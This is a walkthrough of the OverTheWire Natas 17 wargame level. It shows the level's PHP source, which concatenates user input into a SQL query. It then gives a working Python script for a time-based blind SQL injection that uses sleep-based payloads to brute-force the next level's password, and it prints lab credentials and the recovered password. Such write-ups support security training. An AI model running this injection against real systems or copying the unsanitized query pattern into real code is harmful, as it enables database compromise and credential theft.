# Over The Wire -- Natas 17

## Server URL
```
http://natas17:8Ps3H0GWbn5rd9S7GmAdgQNdkhPkq9cw@natas17.natas.labs.overthewire.org
```

## Solution
Again an input box that check if a user exist. Look like Sql Injection again

The php source code :
```php
<html>
<head>
<!-- This stuff in the header has nothing to do with the level -->
<link rel="stylesheet" type="text/css" href="http://natas.labs.overthewire.org/css/level.css">
<link rel="stylesheet" href="http://natas.labs.overthewire.org/css/jquery-ui.css" />
<link rel="stylesheet" href="http://natas.labs.overthewire.org/css/wechall.css" />
<script src="http://natas.labs.overthewire.org/js/jquery-1.9.1.js"></script>
<script src="http://natas.labs.overthewire.org/js/jquery-ui.js"></script>
<script src=http://natas.labs.overthewire.org/js/wechall-data.js></script><script src="http://natas.labs.overthewire.org/js/wechall.js"></script>
<script>var wechallinfo = { "level": "natas17", "pass": "<censored>" };</script></head>
<body>
<h1>natas17</h1>
<div id="content">
<?

/*
CREATE TABLE `users` (
  `username` varchar(64) DEFAULT NULL,
  `password` varchar(64) DEFAULT NULL
);
*/

if(array_key_exists("username", $_REQUEST)) {
    $link = mysql_connect('localhost', 'natas17', '<censored>');
    mysql_select_db('natas17', $link);
    
    $query = "SELECT * from users where username=\"".$_REQUEST["username"]."\"";
    if(array_key_exists("debug", $_GET)) {
        echo "Executing query: $query<br>";
    }

    $res = mysql_query($query, $link);
    if($res) {
    if(mysql_num_rows($res) > 0) {
        //echo "This user exists.<br>";
    } else {
        //echo "This user doesn't exist.<br>";
    }
    } else {
        //echo "Error in query.<br>";
    }

    mysql_close($link);
} else {
?>

<form action="index.php" method="POST">
Username: <input name="username"><br>
<input type="submit" value="Check existence" />
</form>
<? } ?>
<div id="viewsource"><a href="index-source.html">View sourcecode</a></div>
</div>
</body>
</html>
```

Same as `Natas15` but we don't get any output.
We are gonna need to do some timing attack.

We can still see the executed query using the `debug` query parameter

In the beginning, I had some trouble getting my timing attack to work so I came back to `Natas15`. In this level, we get some output (User exist, Doesn't exist, query error).

In the end, it was as simple as adding `and sleep(3) #` to the query..

Here is the python script to bruteforce the password :

```py
import requests
import string
import time

url = "http://natas17:8Ps3H0GWbn5rd9S7GmAdgQNdkhPkq9cw@natas17.natas.labs.overthewire.org?debug=true"

user = 'natas18'
sleep_time=3
passwd = ""
passwd_len = 32
for i in range(len(passwd), passwd_len):
    for char in string.digits + string.ascii_letters:
        trying = f"{passwd}{char}"
        cmd = f"{user}\" and BINARY password LIKE \"{trying}%\" and sleep({sleep_time}) #"
        start = time.time()
        r = requests.post(url, data={'username':cmd})
        elapsed = time.time() - start

        splitted = r.text.split('Executing query: ')[1].split('<br>')
        query_executed = splitted[0]
        warning_or_error = splitted[1]

        print(f"{query_executed} -- {elapsed}")

        if elapsed > sleep_time:
            passwd += char
            print(f"Got char -- Curent pass : {passwd}")
            break

print(f"Natas18 password is {passwd}")
```

The passord for Natas18 is :
```
xvKIqDjy4OPv7wCRgDlmj0pFsCsDjhdP
```

